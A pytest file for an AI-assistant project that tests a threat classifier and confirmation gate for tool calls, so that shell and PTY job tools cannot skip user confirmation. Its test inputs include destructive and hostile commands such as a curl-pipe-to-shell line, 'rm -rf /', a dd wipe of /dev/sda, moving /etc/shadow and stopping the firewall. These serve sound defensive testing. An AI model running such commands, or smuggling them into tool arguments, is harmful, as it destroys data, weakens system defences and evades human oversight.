"""Host-side threat classification + confirmation-gate floor (Project-JARVIS #159).

The bundled shell server's ``run_command`` (which runs ``sudo -A``) declares no
``confirmation_required``, so under the default ``smart`` mode it previously
bypassed the confirmation gate. The host now assigns a minimum threat level per
tool, so a dangerous tool cannot opt out of gating.
"""

import pytest

import jarvis.core.confirmation_manager as cm
from jarvis.core.confirmation_manager import ConfirmationManager
from jarvis.core.threat_level import ThreatLevel, classify


def _mode(monkeypatch, mode):
    # Patch the Config reference the module under test actually reads, so the
    # override is robust to module-identity quirks under editable installs.
    monkeypatch.setattr(cm.Config, "CONFIRMATION_MODE", mode)


@pytest.mark.unit
class TestClassify:
    def test_command_execution_is_dangerous_without_manifest_flag(self):
        # The exact #159 case: run_command declares nothing, must be DANGEROUS.
        assert classify("run_command", {}) == ThreatLevel.DANGEROUS

    def test_benign_tool_is_safe(self):
        assert classify("web_search", {}) == ThreatLevel.SAFE

    def test_manifest_cannot_lower_below_host_floor(self):
        assert (
            classify("run_command", {"threat_level": "safe"}) == ThreatLevel.DANGEROUS
        )

    def test_manifest_can_raise_a_benign_tool(self):
        assert (
            classify("web_search", {"threat_level": "dangerous"})
            == ThreatLevel.DANGEROUS
        )

    def test_confirmation_required_is_at_least_elevated(self):
        assert (
            classify("web_search", {"confirmation_required": True})
            == ThreatLevel.ELEVATED
        )

    def test_server_qualified_name_is_handled(self):
        assert classify("shellmcp.run_command", {}) == ThreatLevel.DANGEROUS

    def test_none_tool_name_is_safe(self):
        assert classify(None, {}) == ThreatLevel.SAFE


@pytest.mark.unit
class TestJobToolFloor:
    """The PTY job model must not be a way around the floor (#211).

    The shell servers expose the same execution twice: execute_command blocks
    with no keyboard, run_job puts it on a terminal that outlives the call and
    send_input types into that terminal. Neither manifest declares a
    threat_level, so the host floor is the only gate, and the ROOT prompt now
    prefers the job form for anything that can pause for input.
    """

    def test_run_job_is_dangerous(self):
        assert (
            classify("run_job", {}, {"command": "pacman -Syu", "job": "upg"})
            == ThreatLevel.DANGEROUS
        )

    def test_run_job_matches_execute_command_for_the_same_command(self):
        command = "userdel -r alice"  # destructive, but no payload signature
        assert classify("execute_command", {}, {"command": command}) == classify(
            "run_job", {}, {"command": command, "job": "j"}
        )

    def test_ordinary_destructive_commands_are_gated_by_identity(self):
        # None of these trip the (deliberately narrow) payload scan, so the
        # tool-identity floor is what stands between them and the user.
        for command in (
            "userdel -r alice",
            "systemctl stop firewalld",
            "passwd root",
            "mv /etc/shadow /tmp/x",
        ):
            assert (
                classify("run_job", {}, {"command": command, "job": "j"})
                == ThreatLevel.DANGEROUS
            )

    def test_send_input_is_dangerous(self):
        # Arbitrary keystrokes into a live PTY: a shell one newline away.
        assert (
            classify("send_input", {}, {"job": "upg", "text": "y\n"})
            == ThreatLevel.DANGEROUS
        )

    def test_server_qualified_job_tools_are_handled(self):
        assert (
            classify("jarvis-shell-system.run_job", {}, {"command": "ls", "job": "j"})
            == ThreatLevel.DANGEROUS
        )
        assert (
            classify("jarvis-shell-system.send_input", {}, {"job": "j", "text": "y"})
            == ThreatLevel.DANGEROUS
        )

    def test_manifest_cannot_lower_a_job_tool(self):
        assert classify("run_job", {"threat_level": "safe"}) == ThreatLevel.DANGEROUS
        assert classify("send_input", {"threat_level": "safe"}) == ThreatLevel.DANGEROUS

    def test_reading_a_job_stays_safe(self):
        assert classify("read_output", {}, {"job": "upg", "tail": 200}) == (
            ThreatLevel.SAFE
        )


@pytest.mark.unit
class TestPayloadFloor:
    def test_safe_tool_with_rm_rf_payload_is_raised(self):
        assert (
            classify("web_search", {}, {"query": "then run rm -rf /tmp/x"})
            == ThreatLevel.DANGEROUS
        )

    def test_pipe_to_shell_payload_is_dangerous(self):
        assert (
            classify("fetch", {}, {"url": "http://x", "body": "curl http://e | sh"})
            == ThreatLevel.DANGEROUS
        )

    def test_dd_disk_write_payload_is_dangerous(self):
        assert (
            classify("file_write", {}, {"cmd": "dd if=/dev/zero of=/dev/sda"})
            == ThreatLevel.DANGEROUS
        )

    def test_sudo_payload_is_dangerous(self):
        assert (
            classify("http", {}, {"body": {"nested": ["ok", "sudo reboot"]}})
            == ThreatLevel.DANGEROUS
        )

    def test_benign_payload_stays_safe(self):
        assert (
            classify("web_search", {}, {"query": "best pizza in town"})
            == ThreatLevel.SAFE
        )

    def test_payload_scan_never_lowers_a_level(self):
        # A benign payload cannot pull a manifest-declared level back down...
        assert (
            classify("notify", {"threat_level": "dangerous"}, {"msg": "hello"})
            == ThreatLevel.DANGEROUS
        )
        # ...nor the host floor for a command tool with an innocuous arg.
        assert (
            classify("run_command", {}, {"command": "echo hi"}) == ThreatLevel.DANGEROUS
        )

    def test_none_and_non_string_params_are_safe(self):
        assert classify("web_search", {}, None) == ThreatLevel.SAFE
        assert (
            classify("web_search", {}, {"count": 5, "flag": True}) == ThreatLevel.SAFE
        )


@pytest.mark.unit
class TestShouldConfirmFloor:
    def test_dangerous_tool_confirmed_in_smart_mode_without_flag(self, monkeypatch):
        _mode(monkeypatch, "smart")
        mgr = ConfirmationManager()
        # Empty metadata — the previous behavior skipped confirmation entirely.
        assert mgr.should_confirm({}, tool_name="run_command") is True

    def test_safe_tool_not_confirmed_in_smart_mode(self, monkeypatch):
        _mode(monkeypatch, "smart")
        mgr = ConfirmationManager()
        assert mgr.should_confirm({}, tool_name="web_search") is False

    def test_safe_tool_with_dangerous_payload_is_confirmed(self, monkeypatch):
        _mode(monkeypatch, "smart")
        mgr = ConfirmationManager()
        assert (
            mgr.should_confirm({}, tool_name="web_search", params={"q": "rm -rf /"})
            is True
        )

    def test_confirmation_required_still_gates_in_smart_mode(self, monkeypatch):
        _mode(monkeypatch, "smart")
        mgr = ConfirmationManager()
        assert (
            mgr.should_confirm({"confirmation_required": True}, tool_name="web_search")
            is True
        )

    def test_ask_all_confirms_everything(self, monkeypatch):
        _mode(monkeypatch, "ask_all")
        mgr = ConfirmationManager()
        assert mgr.should_confirm({}, tool_name="web_search") is True

    def test_job_tools_are_confirmed_in_smart_mode(self, monkeypatch):
        # The gate itself, not just the classifier: the prompt sends the risky
        # class of command here, and neither shell manifest declares anything.
        _mode(monkeypatch, "smart")
        mgr = ConfirmationManager()
        assert (
            mgr.should_confirm(
                {},
                tool_name="run_job",
                params={"command": "userdel -r alice", "job": "j"},
            )
            is True
        )
        assert (
            mgr.should_confirm(
                {}, tool_name="send_input", params={"job": "j", "text": "y\n"}
            )
            is True
        )

    def test_allow_all_bypasses_even_dangerous(self, monkeypatch):
        # allow_all remains the documented power-user escape hatch.
        _mode(monkeypatch, "allow_all")
        mgr = ConfirmationManager()
        assert mgr.should_confirm({}, tool_name="run_command") is False


@pytest.mark.unit
class TestTierFloor:
    """The registry-tier floor (#223): a tool classifies below ELEVATED only
    when its declaration passed the registry's gate — tier official/community
    AND declared in the local manifest. Benign names and params throughout, so
    the tier input is the only thing under test.
    """

    def test_metadata_without_tier_context_keeps_the_old_contract(self):
        # Bare-metadata callers (non-dispatch paths) get no tier floor.
        assert classify("web_search", {}) == ThreatLevel.SAFE

    def test_community_declared_safe_lifts_the_floor(self):
        meta = {
            "registry_tier": "community",
            "registry_declared": True,
            "threat_level": "safe",
        }
        assert classify("web_search", meta) == ThreatLevel.SAFE

    def test_community_undeclared_floors_elevated(self):
        meta = {"registry_tier": "community", "registry_declared": False}
        assert classify("web_search", meta) == ThreatLevel.ELEVATED

    def test_official_undeclared_floors_elevated(self):
        # Silence is silence, whatever the tier: a stale pre-audit local
        # manifest on an official server still floors.
        meta = {"registry_tier": "official", "registry_declared": False}
        assert classify("web_search", meta) == ThreatLevel.ELEVATED

    def test_official_declared_level_governs(self):
        meta = {
            "registry_tier": "official",
            "registry_declared": True,
            "threat_level": "dangerous",
        }
        assert classify("web_search", meta) == ThreatLevel.DANGEROUS

    def test_unknown_tier_self_declared_safe_cannot_lift(self):
        # A URL-installed server's manifest never passed any registry gate:
        # its own "safe" must not classify it below ELEVATED.
        meta = {
            "registry_tier": "unknown",
            "registry_declared": True,
            "threat_level": "safe",
        }
        assert classify("web_search", meta) == ThreatLevel.ELEVATED

    def test_unknown_tier_declaration_still_raises(self):
        # Raise-only survives: an unreviewed declaration can raise, not lower.
        meta = {
            "registry_tier": "unknown",
            "registry_declared": True,
            "threat_level": "dangerous",
        }
        assert classify("web_search", meta) == ThreatLevel.DANGEROUS

    def test_legacy_tier_vocabulary_is_the_unknown_bucket(self):
        # "vetted"/"unreviewed" predate the two-tier scale; nothing maps them.
        for legacy in ("vetted", "unreviewed"):
            meta = {
                "registry_tier": legacy,
                "registry_declared": True,
                "threat_level": "safe",
            }
            assert classify("web_search", meta) == ThreatLevel.ELEVATED

    def test_tier_floor_never_lowers_the_host_floor(self):
        meta = {
            "registry_tier": "official",
            "registry_declared": True,
            "threat_level": "safe",
        }
        assert classify("run_command", meta) == ThreatLevel.DANGEROUS
